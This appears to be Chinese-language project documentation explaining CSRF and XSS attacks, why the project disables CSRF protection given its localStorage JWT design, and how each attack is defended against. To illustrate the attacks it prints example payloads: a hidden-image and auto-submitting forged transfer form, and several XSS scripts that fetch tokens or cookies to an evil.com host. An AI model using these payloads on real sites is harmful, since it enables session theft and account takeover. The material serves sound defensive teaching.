# CSRF 与 XSS 攻击详解

> CSRF 和 XSS 是 Web 安全中最常见的两类攻击，两者经常被混淆，但本质上完全不同。
> 本文结合本项目的实际设计，彻底讲清这两种攻击的原理、手段和防御方式。

---

## 一、CSRF（跨站请求伪造）

### 1.1 CSRF 是什么

**CSRF（Cross-Site Request Forgery，跨站请求伪造）** 的核心思路是：

> 攻击者诱骗你的浏览器，以你的身份，偷偷向你已登录的网站发送请求。

注意这里的关键词：
- **你的身份**：攻击者并不知道你的密码，但浏览器会自动携带你的 Cookie
- **偷偷**：你完全不知情，甚至只是打开了一个网页
- **以你的名义**：服务器看到的请求来自你的 Cookie，认为是你本人操作

---

### 1.2 一个具体的攻击场景

**前提条件**：
- 你已经登录了 `bank.com`，浏览器里存着 `bank.com` 的登录 Cookie
- Cookie 的 `SameSite` 属性没有设置（老式 Cookie 默认行为）

**攻击过程**：

```
第一步：你打开了攻击者发来的链接，进入 evil.com

第二步：evil.com 的页面里藏着这段代码：

   方式1：一张看不见的图片
   <img src="https://bank.com/api/transfer?to=attacker&amount=10000" style="display:none">

   浏览器加载图片时，会向 bank.com 发出 GET 请求，
   自动携带你的 bank.com Cookie！

   方式2：自动提交的表单
   <form id="csrf-form" action="https://bank.com/api/transfer" method="POST">
       <input type="hidden" name="to" value="attacker">
       <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.getElementById('csrf-form').submit();</script>

   页面加载后立即自动提交表单，同样携带 Cookie。

第三步：bank.com 收到请求
   → 检查 Cookie：有效 ✅
   → 执行转账：成功

第四步：你的账户少了一万块，你完全不知情
```

---

### 1.3 CSRF 能成功的根本原因

**浏览器的 Cookie 自动携带机制**。

浏览器有一个默认行为：当你向某个域名发请求时，会自动把属于那个域名的 Cookie 带上，不管这个请求是由哪个网页触发的。

```
正常情况：
  你在 bank.com → 点击"转账"按钮 → 浏览器发请求，带 bank.com Cookie ✅

CSRF 利用的：
  你在 evil.com → 页面里的代码触发 → 浏览器发请求到 bank.com，带 bank.com Cookie ❌

  浏览器并不区分"是你主动点的"还是"网页代码偷偷触发的"，都会带 Cookie！
```

这就是 CSRF 的根基——它利用的不是浏览器的漏洞，而是浏览器"方便用户"的正常设计。

---

### 1.4 CSRF 的防御方式

**方法一：CSRF Token（最经典）**

服务器在给用户返回页面时，在表单里嵌入一个随机生成的 Token，每次请求都必须带上这个 Token。

```
服务器生成页面时嵌入：
<form action="/api/transfer" method="POST">
    <input type="hidden" name="_csrf" value="a3f8c2d1-9e4b-4f2a-...">  ← 随机 Token
    <input name="amount">
    <button>转账</button>
</form>

用户提交时，Token 一起发送到服务器。
服务器验证 Token 是否匹配，不匹配则拒绝。

为什么 evil.com 没法伪造？
因为 evil.com 的代码读不到 bank.com 页面里的内容（同源策略限制），
所以它不知道这个 Token 是什么，无法在请求里带上正确的 Token。
```

**方法二：检查 Referer/Origin 头**

服务器检查请求是从哪个页面发来的。如果 `Referer` 是 `evil.com`，直接拒绝。

缺点：Referer 有时会被浏览器隐去（隐私模式），不够可靠。

**方法三：SameSite Cookie 属性（现代推荐）**

```
Set-Cookie: session=xxx; SameSite=Strict
  → 只有从 bank.com 本身发出的请求才带 Cookie
  → evil.com 触发的请求不带 Cookie，CSRF 直接失效

Set-Cookie: session=xxx; SameSite=Lax
  → 顶级导航（点链接跳转）可以带，跨站的 POST/XHR 等不带
  → 防护效果稍弱但兼容性更好
```

---

### 1.5 本项目为什么可以禁用 CSRF 保护？

本项目在 `SecurityConfig.java` 里明确禁用了 CSRF：

```java
.csrf(AbstractHttpConfigurer::disable)
```

这是安全的，原因只有一个：**本项目完全不使用 Cookie 作为认证凭证**。

```
CSRF 攻击的必要条件：浏览器会自动携带目标域的 Cookie

本项目的认证机制：
  用户登录 → 服务器返回 JWT（Access Token + Refresh Token）
  JWT 存储在前端的 localStorage 里
  每次请求，前端代码主动读取 JWT，手动加入 Authorization 头：

  fetch('/api/v1/knowposts', {
      headers: {
          'Authorization': 'Bearer eyJhbGciOiJSUzI1NiJ9...'
      }
  })

浏览器不会自动携带 localStorage 里的数据！
攻击者在 evil.com 写的代码，也无法读取 localStorage（同源策略限制）。

所以：CSRF 攻击的前提条件在本项目中根本不成立，禁用 CSRF 保护完全安全。

  不用 Cookie 认证  →  不怕 CSRF  →  可以 csrf().disable()
```

**反过来的推论**：如果有一天本项目改成用 Cookie 存储 JWT（HttpOnly Cookie），那就必须重新开启 CSRF 保护。

---

### 1.6 CSRF 与 CORS 的关系

很多人把 CORS 当成 CSRF 的防御手段，这是误解。

```
CORS 能防 CSRF 吗？

答案：部分能，但不完全。

能防的部分：
  CORS 阻止 evil.com 的 JS 读取跨域响应。
  evil.com 的 JS 发 fetch() 请求 → 服务器处理了 → 浏览器拦截响应 → evil.com JS 读不到结果。
  对于需要读取响应数据的攻击，CORS 有效。

不能防的部分：
  CORS 无法阻止"简单请求"实际到达服务器并被执行！
  <img src="https://bank.com/api/transfer?to=attacker&amount=10000">
  这个 GET 请求会真实发出，服务器真实处理，只是 evil.com 读不到响应。
  如果转账接口是 GET（糟糕的设计），CORS 根本帮不上忙。

  对于不需要读取响应、只需要"触发操作"的攻击，CORS 无效。

正确的理解：
  CORS 是保护"响应数据不被别的网站读走"的机制
  CSRF Token 是保护"写操作不被伪造触发"的机制
  两者保护的方向不同，不能互相替代
```

---

## 二、XSS（跨站脚本注入）

### 2.1 XSS 是什么

**XSS（Cross-Site Scripting，跨站脚本攻击）** 的核心思路是：

> 攻击者把恶意 JavaScript 代码注入到目标网站的页面里，让受害者的浏览器执行这段代码。

与 CSRF 的根本区别：
- **CSRF**：攻击者的代码在 `evil.com` 上执行，从外部冒充你
- **XSS**：攻击者的代码被注入到 `target.com` 上执行，从内部冒充你（绕过同源策略！）

XSS 的危害远大于 CSRF，因为一旦恶意代码在目标网站的上下文里执行，它就拥有和正常 JS 代码一样的权限：
- 读取页面上的任何内容
- 读取 `localStorage`、`sessionStorage`（包括 JWT！）
- 发送任意请求（携带完整凭证）
- 修改页面内容（钓鱼）
- 记录键盘输入

---

### 2.2 XSS 的三种类型

#### 类型一：存储型 XSS（最危险）

恶意代码被永久存储在服务器的数据库里，每次受害者访问页面时都会执行。

```
场景：评论功能

攻击者发表一条"评论"：
  内容：<script>
            // 偷走 localStorage 里的 JWT
            var token = localStorage.getItem('access_token');
            // 发送给攻击者的服务器
            fetch('https://evil.com/steal?token=' + token);
        </script>

服务器把这条评论存入数据库。

受害者访问评论页面：
  服务器把评论内容原样输出到 HTML 里
  浏览器渲染 HTML，执行了 <script> 标签里的代码
  受害者的 JWT 被发送到 evil.com
  攻击者拿到 JWT，可以伪装成受害者访问所有接口
```

#### 类型二：反射型 XSS

恶意代码通过 URL 参数传入，服务器直接把参数内容"反射"回响应页面。

```
攻击者构造一个链接，发给受害者：
https://target.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>

受害者点击链接，服务器不经过滤直接输出：
<div>搜索结果：<script>fetch('https://evil.com?c='+document.cookie)</script></div>

浏览器执行了脚本，Cookie 被偷走。

特点：
  - 不存储在服务器，每次攻击需要受害者点击特制链接
  - 常见于搜索框、错误提示等把用户输入直接回显的地方
```

#### 类型三：DOM 型 XSS

恶意代码通过修改页面的 DOM 结构注入，整个过程不经过服务器，纯粹在浏览器里完成。

```
前端代码（有漏洞）：
document.getElementById('output').innerHTML = location.hash.substring(1);
// 把 URL # 后面的内容直接写入 DOM

攻击者构造 URL：
https://target.com/page#<img src=x onerror="fetch('https://evil.com?c='+localStorage.getItem('token'))">

受害者打开链接：
  浏览器把 # 后的内容写入 innerHTML
  img 标签加载失败，触发 onerror 里的 JS
  localStorage 里的 token 被偷走

特点：
  - 全程在浏览器里完成，服务器日志里什么都看不到
  - 漏洞在前端代码里
```

---

### 2.3 XSS 对本项目的威胁

本项目使用 JWT 存储在 `localStorage`，XSS 是最直接的威胁：

```
攻击成功后，攻击者的代码在 zhiguang.cn 上下文里执行：

// 读取 localStorage 里的 JWT
var accessToken = localStorage.getItem('access_token');
var refreshToken = localStorage.getItem('refresh_token');

// 发送给攻击者服务器
fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ at: accessToken, rt: refreshToken })
});

后果：
  攻击者拿到 Access Token → 15分钟内可伪装成用户访问所有接口
  攻击者拿到 Refresh Token → 可以不断刷新，获得新的 AT，实现长期控制
  除非用户主动登出（白名单撤销 RT），否则攻击者的访问权限不会消失
```

这也正是 `RT盗用检测与防御方案设计.md` 中设计多层防御机制的核心原因。

---

### 2.4 XSS 的防御方式

**方法一：输出转义（最重要）**

所有用户输入的内容，在输出到 HTML 时必须转义特殊字符：

```
原始输入：  <script>alert('xss')</script>
转义之后：  &lt;script&gt;alert('xss')&lt;/script&gt;

浏览器会把它显示为普通文字，而不是执行代码。

需要转义的字符：
  <  →  &lt;
  >  →  &gt;
  &  →  &amp;
  "  →  &quot;
  '  →  &#x27;

现代前端框架（React、Vue、Angular）默认会对 {} 插值表达式进行转义，
但要注意 dangerouslySetInnerHTML（React）或 v-html（Vue）这类接口——
它们故意绕过转义，如果传入未过滤的用户数据，就是 XSS 漏洞。
```

**方法二：输入过滤与验证**

对用户输入进行严格校验，只允许符合预期格式的内容通过：

```
用户名：只允许字母、数字、下划线，拒绝 <、> 等特殊符号
评论内容：如果需要支持富文本，用专业的 HTML 白名单库（如 jsoup）过滤
         只允许 <b>、<i>、<p> 等安全标签，拒绝 <script>、onerror= 等
```

**方法三：Content Security Policy（CSP）**

CSP 是浏览器的一个安全机制，通过 HTTP 响应头告诉浏览器"只能执行来自哪些来源的脚本"：

```
服务器返回响应头：
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'

含义：
  default-src 'self'  → 默认只信任来自本域的资源
  script-src 'self'   → 只执行来自本域的 JS 文件，
                         内联 <script> 标签里的代码 → 不执行！

如果攻击者注入了 <script>alert('xss')</script>，
浏览器看到这是内联脚本，CSP 禁止执行，XSS 攻击被挡住。
```

**方法四：HttpOnly Cookie（保护 Cookie 不被 XSS 偷走）**

```
Set-Cookie: session=xxx; HttpOnly

HttpOnly 的含义：
  JavaScript 代码无法读取这个 Cookie（document.cookie 读不到）
  XSS 注入的代码也无法读取这个 Cookie
  只有浏览器在发 HTTP 请求时才会自动带上

所以即使发生了 XSS，攻击者的代码也偷不走 HttpOnly Cookie。

本项目的 JWT 存在 localStorage（非 HttpOnly Cookie），
所以 XSS 可以偷走 JWT——这是 localStorage 存 JWT 的已知风险权衡，
对应地需要更强的 XSS 防护和 RT 盗用检测。
```

**方法五：避免危险的 DOM 操作**

```javascript
// 危险：直接把用户输入写入 innerHTML
element.innerHTML = userInput;

// 安全：使用 textContent（自动转义）
element.textContent = userInput;

// 危险：用 eval 执行动态代码
eval(userInput);

// 危险：用 location.href 跳转到用户提供的 URL（可能是 javascript: 协议）
location.href = userInput;  // 如果 userInput = "javascript:alert('xss')" 就出问题了
```

---

## 三、CSRF vs XSS 核心对比

这是最容易混淆的地方，用一张表格彻底区分：

```
┌─────────────┬────────────────────────────┬────────────────────────────┐
│             │          CSRF              │           XSS              │
├─────────────┼────────────────────────────┼────────────────────────────┤
│ 攻击本质    │ 利用浏览器自动携带 Cookie  │ 在目标网站注入恶意脚本     │
│             │ 冒充用户发请求             │ 以目标网站身份执行代码     │
├─────────────┼────────────────────────────┼────────────────────────────┤
│ 恶意代码    │ 在攻击者网站(evil.com)上   │ 被注入到目标网站(target.com)│
│ 在哪运行    │                            │ 上运行                     │
├─────────────┼────────────────────────────┼────────────────────────────┤
│ 是否绕过    │ 不绕过，从外部攻击         │ 完全绕过！代码已在目标网站 │
│ 同源策略    │                            │ 内部运行，同源策略失效     │
├─────────────┼────────────────────────────┼────────────────────────────┤
│ 攻击者能    │ 只能触发操作               │ 读数据、触发操作、修改页面 │
│ 做什么      │ 不能读取响应数据           │ 键盘记录、持久控制...全都行 │
├─────────────┼────────────────────────────┼────────────────────────────┤
│ 攻击必要    │ 用户已登录，且认证用 Cookie│ 目标网站存在内容注入漏洞   │
│ 条件        │                            │                            │
├─────────────┼────────────────────────────┼────────────────────────────┤
│ 主要防御    │ CSRF Token                 │ 输出转义                   │
│ 手段        │ SameSite Cookie            │ CSP                        │
│             │ 不用 Cookie 认证           │ HttpOnly Cookie            │
├─────────────┼────────────────────────────┼────────────────────────────┤
│ 本项目      │ 不用 Cookie，天然免疫      │ 存在风险（JWT在localStorage）│
│ 的情况      │ 已 csrf().disable()        │ 需要前端严格防 XSS         │
└─────────────┴────────────────────────────┴────────────────────────────┘
```

---

## 四、本项目的整体安全策略回顾

结合本项目的认证设计，梳理对两种攻击的防护状态：

### 对 CSRF 的防护

```
状态：天然免疫 ✅

原因：
  JWT 存储在 localStorage，不是 Cookie
  浏览器不会自动携带 localStorage 数据
  evil.com 的代码也无法读取 localStorage（同源策略）
  攻击者无法在用户不知情时拿到 JWT，也无法构造带有效 JWT 的请求

  → .csrf(AbstractHttpConfigurer::disable) 是安全的正确决策
```

### 对 XSS 的防护

```
状态：存在固有风险，需要前端配合 ⚠️

风险点：
  JWT 在 localStorage，一旦 XSS 得手，AT + RT 全部泄露

后端层面的缓解措施（已有）：
  ✅ Access Token 有效期 15 分钟（泄露的损失窗口有限）
  ✅ Refresh Token 白名单（可通过登出主动撤销 RT）
  ✅ RT 盗用检测（孤儿 RT 检测、IP/UA 异常检测）

前端层面需要做的（后端无法替代）：
  ❌ 所有用户输入输出必须转义
  ❌ 富文本场景使用 HTML 白名单过滤
  ❌ 配置 Content-Security-Policy 响应头
  ❌ 避免 dangerouslySetInnerHTML、v-html 等危险操作
  ❌ 不信任 URL 参数、URL hash 里的内容
```

### 两种攻击的关系

```
XSS 可以辅助 CSRF：
  如果攻击者先通过 XSS 在目标网站注入了代码，
  那么这段代码已经在目标网站的上下文里了，
  它可以直接发请求（自动带 Cookie），CSRF 保护也失效了。

  所以防 XSS 是比防 CSRF 更根本的防护。
  如果 XSS 漏洞存在，CSRF Token 也可能被偷走。
```

---

## 五、一句话总结

> **CSRF**：攻击者在 `evil.com` 上写代码，利用浏览器自动带 Cookie 的特性，以你的身份偷偷发请求。本项目因为用 JWT 而非 Cookie 认证，天然免疫。
>
> **XSS**：攻击者把恶意代码注入到目标网站本身，绕过同源策略，在目标网站上下文里随意读数据、发请求。本项目的 JWT 存在 localStorage，是 XSS 的攻击目标，需要前端严格防护。

